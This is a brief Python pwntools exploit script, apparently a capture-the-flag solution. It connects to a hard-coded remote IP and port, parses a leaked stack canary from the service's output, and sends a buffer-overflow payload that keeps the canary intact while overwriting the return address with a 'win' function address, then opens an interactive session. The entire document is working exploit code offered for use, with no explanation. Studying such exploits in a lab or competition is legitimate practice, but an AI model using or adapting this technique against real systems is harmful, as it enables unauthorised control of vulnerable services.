from pwn import *

win = 0x401260
canary = ''
io = remote("109.233.56.90", 11612)
io.recvuntil(b"I am here ")
leak = io.recvline()
print(leak)
canary = int(leak[9:-1], 16)
print(canary)
io.sendafter(b"Login:", b"pad\n")

io.sendlineafter(b"Welcome,", b"A"*44 + p32(canary) + b"B"*8 + p64(win))
io.interactive()
